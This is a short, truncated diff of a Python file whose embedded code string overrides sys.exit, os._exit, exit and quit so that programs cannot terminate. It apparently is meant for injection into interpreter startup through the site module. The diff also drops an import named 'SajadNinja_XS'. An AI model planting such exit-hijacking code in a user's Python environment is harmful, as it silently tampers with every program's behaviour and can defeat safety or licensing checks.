@@ -1,5 +1,5 @@
 import os,site,sys
-c = r"""import SajadNinja_XS,sys,builtins,os
+c = r"""import sys,builtins,os
 def i(*a,**k): return f"exit({a},{k})\n"
 sys.exit=i;os._exit=i;exitSystem=i;exit=i;quit=i
 sys.exit=i
